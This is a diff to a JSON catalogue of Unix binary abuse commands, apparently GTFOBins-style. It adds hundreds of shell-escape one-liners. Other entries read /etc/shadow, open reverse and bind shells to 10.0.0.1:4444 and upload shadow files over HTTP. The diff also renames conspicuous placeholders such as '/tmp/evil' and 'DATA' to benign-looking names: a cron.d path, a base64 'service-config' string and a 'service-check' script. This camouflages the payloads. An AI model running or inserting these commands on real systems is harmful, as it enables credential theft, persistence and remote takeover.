@@ -10,23 +10,33 @@
       "file-read",
       "file-write",
       "reverse-shell",
+      "shell",
       "upload"
     ],
     "categories_excluded": [
       "capabilities",
       "library-load",
-      "shell",
       "sudo",
       "suid"
     ],
-    "total_commands": 432,
-    "total_binaries": 262
+    "total_commands": 696,
+    "total_binaries": 397
   },
   "commands": [
     {
       "command": "7z a -ttar -an -so /etc/shadow | 7z e -ttar -si -so",
       "binary": "7z",
       "category": "file-read"
+    },
+    {
+      "command": "R --no-save -e 'system(\"/bin/sh\")'",
+      "binary": "R",
+      "category": "shell"
+    },
+    {
+      "command": "aa-exec /bin/sh",
+      "binary": "aa-exec",
+      "category": "shell"
     },
     {
       "command": "ab -v2 http://10.0.0.1/etc/shadow",
@@ -44,9 +54,29 @@
       "category": "command"
     },
     {
+      "command": "agetty -l /bin/sh -o -p -a root tty",
+      "binary": "agetty",
+      "category": "shell"
+    },
+    {
       "command": "alpine -F /etc/shadow",
       "binary": "alpine",
       "category": "file-read"
+    },
+    {
+      "command": "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/tmp/tempfile\nansible-playbook /tmp/tempfile",
+      "binary": "ansible-playbook",
+      "category": "shell"
+    },
+    {
+      "command": "ansible-test shell",
+      "binary": "ansible-test",
+      "category": "shell"
+    },
+    {
+      "command": "aoss /bin/sh",
+      "binary": "aoss",
+      "category": "shell"
     },
     {
       "command": "apache2 -f /etc/shadow",
@@ -64,12 +94,22 @@
       "category": "file-read"
     },
     {
-      "command": "ar r /tmp/evil /etc/shadow\nar p /tmp/evil",
+      "command": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/tmp/tempfile\napt-get -y install -c /tmp/tempfile sl",
+      "binary": "apt-get",
+      "category": "shell"
+    },
+    {
+      "command": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
+      "binary": "apt-get",
+      "category": "shell"
+    },
+    {
+      "command": "ar r /etc/cron.d/update /etc/shadow\nar p /etc/cron.d/update",
       "binary": "ar",
       "category": "file-read"
     },
     {
-      "command": "echo /tmp/evil.sh >/tmp/tempfile\nchmod +x /tmp/tempfile\naria2c --on-download-error=/tmp/tempfile http://some-invalid-domain",
+      "command": "echo /usr/local/bin/service-check >/tmp/tempfile\nchmod +x /tmp/tempfile\naria2c --on-download-error=/tmp/tempfile http://some-invalid-domain",
       "binary": "aria2c",
       "category": "command"
     },
@@ -79,7 +119,7 @@
       "category": "command"
     },
     {
-      "command": "aria2c -o /tmp/evil http://10.0.0.1/etc/shadow",
+      "command": "aria2c -o /etc/cron.d/update http://10.0.0.1/etc/shadow",
       "binary": "aria2c",
       "category": "download"
     },
@@ -89,12 +129,12 @@
       "category": "file-read"
     },
     {
-      "command": "arj a /tmp/evil /etc/shadow\narj p /tmp/evil",
+      "command": "arj a /etc/cron.d/update /etc/shadow\narj p /etc/cron.d/update",
       "binary": "arj",
       "category": "file-read"
     },
     {
-      "command": "echo DATA >output-file\narj a x output-file\narj e x /tmp/outdir/",
+      "command": "echo c2VydmljZS1jb25maWc= >output-file\narj a x output-file\narj e x /tmp/outdir/",
       "binary": "arj",
       "category": "file-write"
     },
@@ -119,9 +159,14 @@
       "category": "file-read"
     },
     {
-      "command": "ash -c 'echo DATA >/tmp/evil'",
+      "command": "ash -c 'echo c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "ash",
       "category": "file-write"
+    },
+    {
+      "command": "ash",
+      "binary": "ash",
+      "category": "shell"
     },
     {
       "command": "aspell -c /etc/shadow",
@@ -134,9 +179,19 @@
       "category": "file-read"
     },
     {
-      "command": "echo /tmp/evil.sh | at now",
+      "command": "asterisk -r\n!/bin/sh",
+      "binary": "asterisk",
+      "category": "shell"
+    },
+    {
+      "command": "echo /usr/local/bin/service-check | at now",
       "binary": "at",
       "category": "command"
+    },
+    {
+      "command": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null",
+      "binary": "at",
+      "category": "shell"
     },
     {
       "command": "atobm /etc/shadow",
@@ -174,12 +229,12 @@
       "category": "file-read"
     },
     {
-      "command": "bash -c '{ echo -ne \"GET /etc/shadow HTTP/1.0\\r\\nhost: 10.0.0.1\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/10.0.0.1/4444 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/tmp/evil'",
+      "command": "bash -c '{ echo -ne \"GET /etc/shadow HTTP/1.0\\r\\nhost: 10.0.0.1\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/10.0.0.1/4444 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/etc/cron.d/update'",
       "binary": "bash",
       "category": "download"
     },
     {
-      "command": "bash -c 'echo \"$(</dev/tcp/10.0.0.1/4444) >/tmp/evil'",
+      "command": "bash -c 'echo \"$(</dev/tcp/10.0.0.1/4444) >/etc/cron.d/update'",
       "binary": "bash",
       "category": "download"
     },
@@ -194,12 +249,12 @@
       "category": "file-read"
     },
     {
-      "command": "bash -c 'echo DATA >/tmp/evil'",
+      "command": "bash -c 'echo c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "bash",
       "category": "file-write"
     },
     {
-      "command": "HISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w /tmp/evil",
+      "command": "HISTIGNORE='history *'\nhistory -c\nc2VydmljZS1jb25maWc=\nhistory -w /etc/cron.d/update",
       "binary": "bash",
       "category": "file-write"
     },
@@ -207,6 +262,11 @@
       "command": "bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'",
       "binary": "bash",
       "category": "reverse-shell"
+    },
+    {
+      "command": "bash",
+      "binary": "bash",
+      "category": "shell"
     },
     {
       "command": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</etc/shadow)\" >/dev/tcp/10.0.0.1/4444'",
@@ -229,9 +289,59 @@
       "category": "file-read"
     },
     {
+      "command": "bconsole\n@exec /bin/sh",
+      "binary": "bconsole",
+      "category": "shell"
+    },
+    {
+      "command": "borg extract @:/::: --rsh \"/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\"",
+      "binary": "borg",
+      "category": "shell"
+    },
+    {
+      "command": "bpftrace --unsafe -e 'BEGIN {system(\"/bin/sh 1<&0\");exit()}'",
+      "binary": "bpftrace",
+      "category": "shell"
+    },
+    {
+      "command": "echo 'BEGIN {system(\"/bin/sh 1<&0\");exit()}' >/tmp/tempfile\nbpftrace --unsafe /tmp/tempfile",
+      "binary": "bpftrace",
+      "category": "shell"
+    },
+    {
+      "command": "bpftrace -c /bin/sh -e 'END {exit()}'",
+      "binary": "bpftrace",
+      "category": "shell"
+    },
+    {
       "command": "bridge -b /etc/shadow",
       "binary": "bridge",
       "category": "file-read"
+    },
+    {
+      "command": "BUNDLE_GEMFILE=x bundle exec /bin/sh",
+      "binary": "bundle",
+      "category": "shell"
+    },
+    {
+      "command": "touch Gemfile\nbundle exec /bin/sh",
+      "binary": "bundle",
+      "category": "shell"
+    },
+    {
+      "command": "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install",
+      "binary": "bundle",
+      "category": "shell"
+    },
+    {
+      "command": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",
+      "binary": "busctl",
+      "category": "shell"
+    },
+    {
+      "command": "busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",
+      "binary": "busctl",
+      "category": "shell"
     },
     {
       "command": "busybox nc -e /bin/sh 10.0.0.1 4444",
@@ -249,14 +359,39 @@
       "category": "file-read"
     },
     {
-      "command": "cancel -h 10.0.0.1:4444 -u DATA",
+      "command": "cabal exec --project-file=/dev/null -- /bin/sh",
+      "binary": "cabal",
+      "category": "shell"
+    },
+    {
+      "command": "cancel -h 10.0.0.1:4444 -u c2VydmljZS1jb25maWc=",
       "binary": "cancel",
       "category": "upload"
+    },
+    {
+      "command": "capsh --",
+      "binary": "capsh",
+      "category": "shell"
     },
     {
       "command": "cat /etc/shadow",
       "binary": "cat",
       "category": "file-read"
+    },
+    {
+      "command": "cdist shell -s /bin/sh",
+      "binary": "cdist",
+      "category": "shell"
+    },
+    {
+      "command": "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'",
+      "binary": "certbot",
+      "category": "shell"
+    },
+    {
+      "command": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C x",
+      "binary": "check_by_ssh",
+      "category": "shell"
     },
     {
       "command": "check_cups --extra-opts=@/etc/shadow",
@@ -269,7 +404,7 @@
       "category": "file-read"
     },
     {
-      "command": "check_log -F /etc/shadow -O /tmp/evil",
+      "command": "check_log -F /etc/shadow -O /etc/cron.d/update",
       "binary": "check_log",
       "category": "file-write"
     },
@@ -284,9 +419,29 @@
       "category": "file-read"
     },
     {
+      "command": "echo 'exec /bin/sh 0<&2 1>&2' >/tmp/tempfile\nchmod +x /tmp/tempfile\ncheck_ssl_cert --grep-bin /tmp/tempfile -H x",
+      "binary": "check_ssl_cert",
+      "category": "shell"
+    },
+    {
       "command": "check_statusfile /etc/shadow",
       "binary": "check_statusfile",
       "category": "file-read"
+    },
+    {
+      "command": "choom -n 0 /bin/sh",
+      "binary": "choom",
+      "category": "shell"
+    },
+    {
+      "command": "chroot /",
+      "binary": "chroot",
+      "category": "shell"
+    },
+    {
+      "command": "chrt 1 /bin/sh",
+      "binary": "chrt",
+      "category": "shell"
     },
     {
       "command": "touch x.yara\nclamscan --no-summary -d x.yara -f /etc/shadow 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'",
@@ -294,14 +449,29 @@
       "category": "file-read"
     },
     {
+      "command": "clisp -x '(ext:run-shell-command \"/bin/sh\")(ext:exit)'",
+      "binary": "clisp",
+      "category": "shell"
+    },
+    {
       "command": "cmake -E cat /etc/shadow",
       "binary": "cmake",
       "category": "file-read"
     },
     {
+      "command": "echo 'execute_process(COMMAND /bin/sh)' >/tmp/build/CMakeLists.txt\ncmake /tmp/build/",
+      "binary": "cmake",
+      "category": "shell"
+    },
+    {
       "command": "cmp /etc/shadow /dev/zero -b -l",
       "binary": "cmp",
       "category": "file-read"
+    },
+    {
+      "command": "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/tmp/tempfile\ncobc -xFj --frelax-syntax-checks /tmp/tempfile",
+      "binary": "cobc",
+      "category": "shell"
     },
     {
       "command": "code tunnel --name xxxxxx",
@@ -319,12 +489,17 @@
       "category": "file-read"
     },
     {
+      "command": "echo '{\"scripts\":{\"x\":\"/bin/sh\"}}' >composer.json\ncomposer run-script x",
+      "binary": "composer",
+      "category": "shell"
+    },
+    {
       "command": "cp /etc/shadow /dev/stdout",
       "binary": "cp",
       "category": "file-read"
     },
     {
-      "command": "echo DATA | cp /dev/stdin /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= | cp /dev/stdin /etc/cron.d/update",
       "binary": "cp",
       "category": "file-write"
     },
@@ -339,12 +514,22 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\necho /tmp/tempfile | cpio -udp .",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\necho /tmp/tempfile | cpio -udp .",
       "binary": "cpio",
       "category": "file-write"
     },
     {
-      "command": "CRASHPAGER=/tmp/evil.sh crash -h",
+      "command": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:",
+      "binary": "cpio",
+      "category": "shell"
+    },
+    {
+      "command": "cpulimit -l 100 -f /bin/sh",
+      "binary": "cpulimit",
+      "category": "shell"
+    },
+    {
+      "command": "CRASHPAGER=/usr/local/bin/service-check crash -h",
       "binary": "crash",
       "category": "command"
     },
@@ -354,9 +539,14 @@
       "category": "command"
     },
     {
-      "command": "csh -c 'echo DATA >/tmp/evil'",
+      "command": "csh -c 'echo c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "csh",
       "category": "file-write"
+    },
+    {
+      "command": "csh",
+      "binary": "csh",
+      "category": "shell"
     },
     {
       "command": "csplit /etc/shadow 1\ncat xx01",
@@ -364,7 +554,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\ncsplit -z -b %doutput-file' /tmp/tempfile 1",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\ncsplit -z -b %doutput-file' /tmp/tempfile 1",
       "binary": "csplit",
       "category": "file-write"
     },
@@ -374,9 +564,19 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\ncsvtool trim t /tmp/tempfile -o /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\ncsvtool trim t /tmp/tempfile -o /etc/cron.d/update",
       "binary": "csvtool",
       "category": "file-write"
+    },
+    {
+      "command": "csvtool call '/bin/sh;false' /etc/hosts",
+      "binary": "csvtool",
+      "category": "shell"
+    },
+    {
+      "command": "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x",
+      "binary": "ctr",
+      "category": "shell"
     },
     {
       "command": "cupsfilter -i application/octet-stream -m application/octet-stream /etc/shadow",
@@ -384,7 +584,7 @@
       "category": "file-read"
     },
     {
-      "command": "curl http://10.0.0.1/etc/shadow -o /tmp/evil",
+      "command": "curl http://10.0.0.1/etc/shadow -o /etc/cron.d/update",
       "binary": "curl",
       "category": "download"
     },
@@ -394,7 +594,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\ncurl file:///tmp/tempfile -o /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\ncurl file:///tmp/tempfile -o /etc/cron.d/update",
       "binary": "curl",
       "category": "file-write"
     },
@@ -404,12 +604,12 @@
       "category": "upload"
     },
     {
-      "command": "curl -X POST --data-binary DATA http://10.0.0.1",
+      "command": "curl -X POST --data-binary c2VydmljZS1jb25maWc= http://10.0.0.1",
       "binary": "curl",
       "category": "upload"
     },
     {
-      "command": "curl gopher://10.0.0.1:4444/_DATA",
+      "command": "curl gopher://10.0.0.1:4444/_c2VydmljZS1jb25maWc=",
       "binary": "curl",
       "category": "upload"
     },
@@ -419,9 +619,14 @@
       "category": "file-read"
     },
     {
-      "command": "dash -c 'echo DATA >/tmp/evil'",
+      "command": "dash -c 'echo c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "dash",
       "category": "file-write"
+    },
+    {
+      "command": "dash",
+      "binary": "dash",
+      "category": "shell"
     },
     {
       "command": "date -f /etc/shadow",
@@ -429,14 +634,29 @@
       "category": "file-read"
     },
     {
+      "command": "dc -e '!/bin/sh'",
+      "binary": "dc",
+      "category": "shell"
+    },
+    {
       "command": "dd if=/etc/shadow",
       "binary": "dd",
       "category": "file-read"
     },
     {
-      "command": "echo DATA | dd of=/tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= | dd of=/etc/cron.d/update",
       "binary": "dd",
       "category": "file-write"
+    },
+    {
+      "command": "debugfs\n!/bin/sh",
+      "binary": "debugfs",
+      "category": "shell"
+    },
+    {
+      "command": "dhclient -sf /bin/sh",
+      "binary": "dhclient",
+      "category": "shell"
     },
     {
       "command": "dialog --textbox /etc/shadow 0 0",
@@ -459,14 +679,24 @@
       "category": "file-read"
     },
     {
+      "command": "distcc /bin/sh",
+      "binary": "distcc",
+      "category": "shell"
+    },
+    {
       "command": "dmesg -rF /etc/shadow",
       "binary": "dmesg",
       "category": "file-read"
     },
     {
-      "command": "dmidecode --no-sysfs -d x.dmi --dump-bin /tmp/evil",
+      "command": "dmidecode --no-sysfs -d x.dmi --dump-bin /etc/cron.d/update",
       "binary": "dmidecode",
       "category": "file-write"
+    },
+    {
+      "command": "dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -s'",
+      "binary": "dmsetup",
+      "category": "shell"
     },
     {
       "command": "dnf install -y x-1.0-1.noarch.rpm --disablerepo=*",
@@ -474,9 +704,14 @@
       "category": "command"
     },
     {
-      "command": "dnsmasq --conf-script='/tmp/evil.sh 1>&2'",
+      "command": "dnsmasq --conf-script='/usr/local/bin/service-check 1>&2'",
       "binary": "dnsmasq",
       "category": "command"
+    },
+    {
+      "command": "doas -u root /bin/sh",
+      "binary": "doas",
+      "category": "shell"
     },
     {
       "command": "docker cp /etc/shadow $CONTAINER_ID:input-file\ndocker cp $CONTAINER_ID:input-file /tmp/tempfile\ncat /tmp/tempfile",
@@ -484,9 +719,19 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\ndocker cp /tmp/tempfile $CONTAINER_ID:temp-file\ndocker cp $CONTAINER_ID /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\ndocker cp /tmp/tempfile $CONTAINER_ID:temp-file\ndocker cp $CONTAINER_ID /etc/cron.d/update",
       "binary": "docker",
       "category": "file-write"
+    },
+    {
+      "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh",
+      "binary": "docker",
+      "category": "shell"
+    },
+    {
+      "command": "docker run --rm -it --privileged -u root alpine\nmount /dev/sda1 /mnt/\nls -la /mnt/\nchroot /mnt /bin/bash",
+      "binary": "docker",
+      "category": "shell"
     },
     {
       "command": "dos2unix -f -O /etc/shadow",
@@ -494,7 +739,7 @@
       "category": "file-read"
     },
     {
-      "command": "dos2unix -f -n /etc/shadow /tmp/evil",
+      "command": "dos2unix -f -n /etc/shadow /etc/cron.d/update",
       "binary": "dos2unix",
       "category": "file-write"
     },
@@ -509,7 +754,7 @@
       "category": "file-read"
     },
     {
-      "command": "dosbox -c 'mount c /' -c \"echo DATA >c:\\path\\to\\output\" -c exit",
+      "command": "dosbox -c 'mount c /' -c \"echo c2VydmljZS1jb25maWc= >c:\\path\\to\\output\" -c exit",
       "binary": "dosbox",
       "category": "file-write"
     },
@@ -519,14 +764,39 @@
       "category": "file-read"
     },
     {
+      "command": "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;",
+      "binary": "dotnet",
+      "category": "shell"
+    },
+    {
+      "command": "dpkg -i x_1.0_all.deb",
+      "binary": "dpkg",
+      "category": "shell"
+    },
+    {
+      "command": "dvips -R0 texput.dvi",
+      "binary": "dvips",
+      "category": "shell"
+    },
+    {
+      "command": "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/tmp/tempfile\neasyrsa --vars=/tmp/tempfile",
+      "binary": "easyrsa",
+      "category": "shell"
+    },
+    {
       "command": "ed /etc/shadow\n,p\nq",
       "binary": "ed",
       "category": "file-read"
     },
     {
-      "command": "ed /tmp/evil\na\nDATA\n.\nw\nq",
+      "command": "ed /etc/cron.d/update\na\nc2VydmljZS1jb25maWc=\n.\nw\nq",
       "binary": "ed",
       "category": "file-write"
+    },
+    {
+      "command": "ed\n!/bin/sh\nq",
+      "binary": "ed",
+      "category": "shell"
     },
     {
       "command": "efax -d /etc/shadow",
@@ -544,9 +814,14 @@
       "category": "file-read"
     },
     {
-      "command": "elvish -c 'print DATA >/tmp/evil'",
+      "command": "elvish -c 'print c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "elvish",
       "category": "file-write"
+    },
+    {
+      "command": "elvish",
+      "binary": "elvish",
+      "category": "shell"
     },
     {
       "command": "emacs /etc/shadow",
@@ -554,9 +829,24 @@
       "category": "file-read"
     },
     {
-      "command": "emacs /tmp/evil\nDATA\nC-x C-s",
+      "command": "emacs /etc/cron.d/update\nc2VydmljZS1jb25maWc=\nC-x C-s",
       "binary": "emacs",
       "category": "file-write"
+    },
+    {
+      "command": "emacs -Q -nw --eval '(term \"/bin/sh\")'",
+      "binary": "emacs",
+      "category": "shell"
+    },
+    {
+      "command": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'",
+      "binary": "enscript",
+      "category": "shell"
+    },
+    {
+      "command": "env /bin/sh",
+      "binary": "env",
+      "category": "shell"
     },
     {
       "command": "eqn /etc/shadow",
@@ -569,27 +859,32 @@
       "category": "file-read"
     },
     {
-      "command": "exiftool -filename=/tmp/evil /etc/shadow\ncat /tmp/evil",
+      "command": "ex -c ':!/bin/sh'",
+      "binary": "ex",
+      "category": "shell"
+    },
+    {
+      "command": "exiftool -filename=/etc/cron.d/update /etc/shadow\ncat /etc/cron.d/update",
       "binary": "exiftool",
       "category": "file-read"
     },
     {
-      "command": "exiftool -filename=/tmp/evil /etc/shadow",
+      "command": "exiftool -filename=/etc/cron.d/update /etc/shadow",
       "binary": "exiftool",
       "category": "file-write"
     },
     {
-      "command": "exiftool \"-description<=/etc/shadow --filename /tmp/evil",
+      "command": "exiftool \"-description<=/etc/shadow --filename /etc/cron.d/update",
       "binary": "exiftool",
       "category": "file-write"
     },
     {
-      "command": "exiftool \"-description=DATA --filename /tmp/evil",
+      "command": "exiftool \"-description=c2VydmljZS1jb25maWc= --filename /etc/cron.d/update",
       "binary": "exiftool",
       "category": "file-write"
     },
     {
-      "command": "exiftool -description -W /tmp/evil --filename /etc/shadow",
+      "command": "exiftool -description -W /etc/cron.d/update --filename /etc/shadow",
       "binary": "exiftool",
       "category": "file-write"
     },
@@ -604,12 +899,17 @@
       "category": "file-read"
     },
     {
-      "command": "fail2ban-client add x\nfail2ban-client set x addaction x\nfail2ban-client set x action x actionban /tmp/evil.sh\nfail2ban-client start x\nfail2ban-client set x banip 999.999.999.999\nfail2ban-client set x unbanip 999.999.999.999\nfail2ban-client stop x",
+      "command": "expect -c 'spawn /bin/sh;interact'",
+      "binary": "expect",
+      "category": "shell"
+    },
+    {
+      "command": "fail2ban-client add x\nfail2ban-client set x addaction x\nfail2ban-client set x action x actionban /usr/local/bin/service-check\nfail2ban-client start x\nfail2ban-client set x banip 999.999.999.999\nfail2ban-client set x unbanip 999.999.999.999\nfail2ban-client stop x",
       "binary": "fail2ban-client",
       "category": "command"
     },
     {
-      "command": "cat >/tmp/tempdir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/tmp/tempdir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /tmp/tempdir/action.d/\ncat >/tmp/tempdir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /tmp/evil.sh\nEOF\n\nmkdir -p /tmp/tempdir/filter.d/\ncat >/tmp/tempdir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /tmp/tempdir/ -v restart",
+      "command": "cat >/tmp/tempdir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/tmp/tempdir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /tmp/tempdir/action.d/\ncat >/tmp/tempdir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /usr/local/bin/service-check\nEOF\n\nmkdir -p /tmp/tempdir/filter.d/\ncat >/tmp/tempdir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /tmp/tempdir/ -v restart",
       "binary": "fail2ban-client",
       "category": "command"
     },
@@ -629,9 +929,14 @@
       "category": "file-read"
     },
     {
-      "command": "find / -fprintf /tmp/evil DATA -quit",
+      "command": "find / -fprintf /etc/cron.d/update c2VydmljZS1jb25maWc= -quit",
       "binary": "find",
       "category": "file-write"
+    },
+    {
+      "command": "find . -exec /bin/sh \\; -quit",
+      "binary": "find",
+      "category": "shell"
     },
     {
       "command": "finger x@10.0.0.1",
@@ -639,9 +944,24 @@
       "category": "download"
     },
     {
-      "command": "finger DATA@10.0.0.1",
+      "command": "finger c2VydmljZS1jb25maWc=@10.0.0.1",
       "binary": "finger",
       "category": "upload"
+    },
+    {
+      "command": "firejail /bin/sh",
+      "binary": "firejail",
+      "category": "shell"
+    },
+    {
+      "command": "fish",
+      "binary": "fish",
+      "category": "shell"
+    },
+    {
+      "command": "flock -u / /bin/sh",
+      "binary": "flock",
+      "category": "shell"
     },
     {
       "command": "fmt -pNON_EXISTING_PREFIX /etc/shadow",
@@ -659,6 +979,11 @@
       "category": "file-read"
     },
     {
+      "command": "echo '#!/bin/sh' >/tmp/tempfile\necho -e \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" >>/tmp/tempfile\nchmod +x /tmp/tempfile\nforge build --use /tmp/tempfile",
+      "binary": "forge",
+      "category": "shell"
+    },
+    {
       "command": "fping -f /etc/shadow",
       "binary": "fping",
       "category": "file-read"
@@ -667,6 +992,11 @@
       "command": "ftp -a 10.0.0.1\nget /etc/shadow output-file",
       "binary": "ftp",
       "category": "download"
+    },
+    {
+      "command": "ftp\n!/bin/sh",
+      "binary": "ftp",
+      "category": "shell"
     },
     {
       "command": "ftp -a 10.0.0.1\nput /etc/shadow output-file",
@@ -679,6 +1009,11 @@
       "category": "command"
     },
     {
+      "command": "fzf --bind 'enter:execute(/bin/sh)'",
+      "binary": "fzf",
+      "category": "shell"
+    },
+    {
       "command": "gawk 'BEGIN {\n    s = \"/inet/tcp/4444/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",
       "binary": "gawk",
       "category": "bind-shell"
@@ -689,7 +1024,7 @@
       "category": "file-read"
     },
     {
-      "command": "gawk 'BEGIN { print \"DATA\" > \"/tmp/evil\" }'",
+      "command": "gawk 'BEGIN { print \"c2VydmljZS1jb25maWc=\" > \"/etc/cron.d/update\" }'",
       "binary": "gawk",
       "category": "file-write"
     },
@@ -697,6 +1032,11 @@
       "command": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/10.0.0.1/4444\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",
       "binary": "gawk",
       "category": "reverse-shell"
+    },
+    {
+      "command": "gawk 'BEGIN {system(\"/bin/sh\")}'",
+      "binary": "gawk",
+      "category": "shell"
     },
     {
       "command": "gcc -x c -E /etc/shadow",
@@ -714,14 +1054,34 @@
       "category": "file-write"
     },
     {
+      "command": "gcc -wrapper /bin/sh,-s x",
+      "binary": "gcc",
+      "category": "shell"
+    },
+    {
       "command": "gcore $PID",
       "binary": "gcore",
       "category": "file-read"
     },
     {
-      "command": "gdb -nx -ex 'dump value /tmp/evil \"DATA\"' -ex quit",
+      "command": "gdb -nx -ex 'dump value /etc/cron.d/update \"c2VydmljZS1jb25maWc=\"' -ex quit",
       "binary": "gdb",
       "category": "file-write"
+    },
+    {
+      "command": "gdb -nx -ex '!/bin/sh' -ex quit",
+      "binary": "gdb",
+      "category": "shell"
+    },
+    {
+      "command": "gem open -e '/bin/sh -s' debug",
+      "binary": "gem",
+      "category": "shell"
+    },
+    {
+      "command": "genie -c '/bin/sh'",
+      "binary": "genie",
+      "category": "shell"
     },
     {
       "command": "genisoimage -q -o - /etc/shadow",
@@ -734,6 +1094,21 @@
       "category": "file-read"
     },
     {
+      "command": "ghc -e 'System.Process.callCommand \"/bin/sh\"'",
+      "binary": "ghc",
+      "category": "shell"
+    },
+    {
+      "command": "ghci\nSystem.Process.callCommand \"/bin/sh\"",
+      "binary": "ghci",
+      "category": "shell"
+    },
+    {
+      "command": "ginsh\n!/bin/sh",
+      "binary": "ginsh",
+      "category": "shell"
+    },
+    {
       "command": "git diff /dev/null /etc/shadow",
       "binary": "git",
       "category": "file-read"
@@ -742,6 +1117,26 @@
       "command": "git apply --unsafe-paths --directory / x.patch",
       "binary": "git",
       "category": "file-write"
+    },
+    {
+      "command": "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help",
+      "binary": "git",
+      "category": "shell"
+    },
+    {
+      "command": "git init .\necho 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit -C . commit --allow-empty -m x",
+      "binary": "git",
+      "category": "shell"
+    },
+    {
+      "command": "ln -s /bin/sh git-x\ngit --exec-path=. x",
+      "binary": "git",
+      "category": "shell"
+    },
+    {
+      "command": "gnuplot -e 'system(\"/bin/sh 1>&0\")'",
+      "binary": "gnuplot",
+      "category": "shell"
     },
     {
       "command": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\taddr := &syscall.SockaddrInet4{Port: 4444}\\n\\tcopy(addr.Addr[:], []byte{0,0,0,0})\\n\\tsyscall.Bind(fd, addr)\\n\\tsyscall.Listen(fd, 1)\\n\\tnfd, _, _ := syscall.Accept(fd)\\n\\tsyscall.Dup2(nfd, 0)\\n\\tsyscall.Dup2(nfd, 1)\\n\\tsyscall.Dup2(nfd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
@@ -754,7 +1149,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo -e 'package main\\nimport \"os\"\\nfunc main(){\\n\\tf, _ := os.OpenFile(\"/tmp/evil\", os.O_RDWR|os.O_CREATE, 0644)\\n\\tf.Write([]byte(\"DATA\\\\n\"))\\n\\tf.Close()\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
